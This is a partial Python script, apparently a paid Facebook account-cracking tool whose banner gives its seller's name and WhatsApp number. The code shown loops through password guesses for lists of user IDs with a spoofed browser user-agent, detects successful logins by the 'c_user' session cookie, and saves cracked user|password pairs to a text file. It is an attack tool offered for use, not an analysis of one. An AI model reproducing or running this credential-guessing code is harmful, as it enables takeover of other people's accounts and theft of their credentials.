...
\n\x1b[1;92m   ADMIN : \x1b[1;97ssheraz  \x1b[1;95mTOOL:\x1b[1;97mpaid    \x1b[1;91mV:\x1b[1;97m1.5.0
         ...
         \x1b[1;92m  WHATSAPP: \x1b[1;95m+923136751626
          \x1b[1;92m FACEBOOK:  \x1b[1;95msheraz king
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[S=A] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        pass
                    print('\r%s [S=A-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('S=A_CP.txt' , 'a').write('%s\n' % wrt)
                    break
